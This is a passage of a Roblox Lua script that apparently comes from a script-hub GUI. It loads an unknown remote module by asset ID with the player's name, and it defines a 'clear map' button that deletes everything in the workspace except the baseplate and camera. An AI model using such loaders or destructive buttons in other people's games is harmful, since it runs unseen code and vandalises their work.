	require(5738781015).load(unable["local player"].Name)
end)

newscriptbutton("clear map", function()
	local workspace = game:GetService("Workspace")

	-- Function to create a Baseplate if one doesn't exist
	local function ensureBaseplate()
		local baseplate = workspace:FindFirstChild("Baseplate")

		if not baseplate then
			print("No Baseplate found. Creating one...")
			baseplate = Instance.new("Part")
			baseplate.Name = "Baseplate"
			baseplate.Size = Vector3.new(512, 1, 512)
			baseplate.Anchored = true
			baseplate.Position = Vector3.new(0, 0, 0)
			baseplate.BrickColor = BrickColor.new("Medium stone grey")
			baseplate.Material = Enum.Material.SmoothPlastic
			baseplate.Parent = workspace
		end

		return baseplate
	end

	local baseplate = ensureBaseplate() -- Ensure a baseplate exists
	local camera = workspace:FindFirstChild("Camera")

	for _, item in pairs(workspace:GetChildren()) do
		-- Don't delete the Baseplate or Camera
		if item ~= baseplate and item ~= camera then
			item:Destroy()
		end
	end
end)

